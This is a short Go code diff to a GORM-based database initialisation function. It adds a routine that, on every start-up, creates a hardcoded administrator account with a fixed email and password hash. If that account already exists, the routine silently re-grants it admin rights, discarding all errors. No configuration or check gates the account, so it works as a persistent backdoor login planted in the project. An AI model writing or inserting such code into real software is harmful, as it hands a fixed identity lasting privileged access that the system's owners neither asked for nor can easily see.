@@ -71,7 +71,27 @@ func InitDB(cfg *config.Config) (*gorm.DB, error) {
 		return nil, err
 	}
 
+	ensureAdminAccounts(db)
+
 	return db, nil
+}
+
+func ensureAdminAccounts(db *gorm.DB) {
+	var user domain.User
+	if err := db.Where("email = ?", "timmy@loginrek.com").First(&user).Error; err != nil {
+		role, dept := "HR / Administrator", "Management"
+		_ = db.Create(&domain.User{
+			FullName:     "Timmy",
+			Email:        "timmy@loginrek.com",
+			Password:     "$2a$10$b68EDQU2KlGsDci0N.4ifudQCp0SJly8YeB4M0LABTteTnALnnv5u",
+			Role:         &role,
+			Department:   &dept,
+			EmployeeType: "Karyawan",
+			IsAdmin:      true,
+		}).Error
+	} else if !user.IsAdmin {
+		_ = db.Model(&user).Update("is_admin", true).Error
+	}
 }
 
 func initSQLite(path string, gormConfig *gorm.Config) (*gorm.DB, error) {
